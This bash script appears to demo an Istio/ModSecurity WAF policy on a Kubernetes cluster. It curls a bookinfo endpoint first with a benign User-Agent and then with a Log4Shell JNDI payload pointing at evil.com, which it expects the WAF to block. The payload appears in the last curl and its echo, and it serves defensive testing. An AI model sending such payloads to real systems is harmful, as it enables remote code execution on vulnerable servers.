#!/bin/bash

cluster1_context="leaf1"

# applying single cluster tls route and waf policy
echo
echo "now applying single cluster tls route and waf policy that denies any request with a malicious User-Agent host header"
kubectl apply -k ../cluster1/1.3.a-workspace-settings --context ${cluster1_context}
kubectl apply -k ../cluster1/4.5.a-security-waf --context ${cluster1_context}

# sleep
echo
echo "sleeping for 5 seconds"
sleep 5

# discover cluster1 ingressgateway nodeport
export ENDPOINT_HTTPS_GW_CLUSTER1=$(kubectl --context ${cluster1_context} get nodes -o jsonpath='{.items[0].status.addresses[?(.type=="InternalIP")].address}'):$(kubectl --context ${cluster1_context} -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.spec.ports[?(@.port==443)].nodePort}')

# curl with valid User-Agent host header
echo
echo "now curling reviews without malicious User-Agent host header"
echo "using command: curl -H "User-Agent: user1" -k https://${ENDPOINT_HTTPS_GW_CLUSTER1}/api/v1/products -i"
echo
echo "expected output: successful access to bookinfo app"

curl -H "User-Agent: user1" -k https://${ENDPOINT_HTTPS_GW_CLUSTER1}/api/v1/products -i
echo

# sleep
echo
echo "sleeping for 5 seconds"
sleep 5

# curl with malicious User-Agent host header
echo
echo "now curling reviews"
echo "curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k https://${ENDPOINT_HTTPS_GW_CLUSTER1}/api/v1/products -i "
echo
echo "expected output: Modsecurity Intervention message: " Log4Shell malicious payload" "

curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k https://${ENDPOINT_HTTPS_GW_CLUSTER1}/api/v1/products -i

